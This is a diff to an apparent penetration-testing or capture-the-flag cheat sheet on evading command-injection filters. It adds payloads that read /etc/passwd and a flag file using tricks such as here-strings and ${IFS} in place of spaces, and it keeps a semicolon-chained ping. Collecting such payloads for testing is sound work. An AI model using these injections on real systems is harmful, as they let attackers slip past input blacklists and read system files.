@@ -5,6 +5,12 @@ Windows (DOSfuscation)
 
 <hr>
 
+### [No PHP, no spaces, no $, no { }, bash only](https://x.com/asdizzle_/status/895244943526170628)
+```
+`cat<<<cat,/etc/passwd`
+```
+
+
 ### Use new-line instead of ; or &
 #### Example: 
 ```bash
@@ -14,9 +20,10 @@ The `%0a` is an encodded `\n` that will execute the ls command afterwards
 
 <hr>
 
-### Use tabs instead of spaces (bypass spaces blacklist)
+### Use tabs or ${IFS} instead of spaces (bypass spaces blacklist)
 ```bash
 ping 0.0.0.0;ls  -l
+cat${IFS}/flag.txt
 ```
 
 <hr>
